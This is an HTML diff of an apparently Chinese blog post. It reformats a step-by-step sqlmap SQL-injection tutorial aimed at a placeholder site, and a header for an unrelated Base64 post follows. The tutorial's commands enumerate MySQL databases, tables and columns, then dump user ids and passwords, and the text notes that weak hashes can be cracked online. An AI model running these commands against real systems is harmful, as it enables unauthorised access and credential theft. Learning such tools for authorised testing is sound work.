@@ -4,8 +4,26 @@
 </blockquote>
 <p>当你发现疑似可以注入的地方时，使用 -u 参数指定注入页面，如果需以 post 方式注入，可使用 –data 参数，用法如下：</p>
 <blockquote>
-<p>sqlmap.py -u “<a href="http://example.xxx/1.php?id=2&amp;pw=3" target="_blank" rel="external">http://example.xxx/1.php?id=2&amp;pw=3</a>“  (get方式)<br>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  (post方式)<br>如果可以注入，sqlmap 会给出数据库的相关信息提示。<br>接下来就该列出 DBMS 数据库了，使用 –dbs 参数：<br>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  –dbs<br>等了一会，枚举完成，根据这过程中的相关提示我们知道目标为运行在 Ubuntu 上的 MySQL ，所以我们的目标是“mysql”这个数据库。<br>然后需要列出 mysql 数据库中有哪些表，使用 -D 指定数据库，–tables 枚举表：<br>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  -D mysql –tables<br>在结果中有 user 这个表，根据猜想这个表里应该有用户名和密码，下一步枚举这个表中的列，使用 -T 指定表 –columns 枚举列：<br>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  -D mysql -T user –columns<br>结果有好多，其中有 id 和 password 等列，印证了我们的猜想。<br>最后一步便是把用户名和密码 dump 出来，使用 -C 指定列，使用 –dump 来 dump：<br>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  -D mysql -T user -C id,password –dump<br>经过一番等待之后，结果便出来了。</p>
+<p>sqlmap.py -u “<a href="http://example.xxx/1.php?id=2&amp;pw=3" target="_blank" rel="external">http://example.xxx/1.php?id=2&amp;pw=3</a>“  (get方式)</p>
+<p>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  (post方式)</p>
 </blockquote>
+<p>如果可以注入，sqlmap 会给出数据库的相关信息提示。<br>接下来就该列出 DBMS 数据库了，使用 –dbs 参数：</p>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  –dbs</p>
+</blockquote>
+<p>等了一会，枚举完成，根据这过程中的相关提示我们知道目标为运行在 Ubuntu 上的 MySQL ，所以我们的目标是“mysql”这个数据库。<br>然后需要列出 mysql 数据库中有哪些表，使用 -D 指定数据库，–tables 枚举表：</p>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  -D mysql –tables</p>
+</blockquote>
+<p>在结果中有 user 这个表，根据猜想这个表里应该有用户名和密码，下一步枚举这个表中的列，使用 -T 指定表 –columns 枚举列：</p>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  -D mysql -T user –columns</p>
+</blockquote>
+<p>结果有好多，其中有 id 和 password 等列，印证了我们的猜想。<br>最后一步便是把用户名和密码 dump 出来，使用 -C 指定列，使用 –dump 来 dump：</p>
+<blockquote>
+<p>sqlmap.py -u “<a href="http://example.xxx/1.php" target="_blank" rel="external">http://example.xxx/1.php</a>“ –data “id=2&amp;pw=3”  -D mysql -T user -C id,password –dump</p>
+</blockquote>
+<p>经过一番等待之后，结果便出来了。</p>
 <p>如果是原始密码弱密码的话，可以轻易在一些解密网站上查得到原始密码。</p>
 </div></article><article><header><h2><a href="/简单的Base64编码解码程序（纯C语言）.html">简单的Base64编码解码程序（纯C语言）</a></h2></header><div class="article-meta clearfix"><time class="left">2016-04-19</time><ul class="tags left"></ul><ul class="tags right"></ul></div><div class="markdown-body"><p>先声明一下这其中编码解码的算法部分不是我手打的，是参考现有的程序。<br>该代码编译后可直接运行，亦可带参运行，程序内有提示。<br>有时间我会把它做成PHP版，那就更方便了。</p>
 <blockquote>
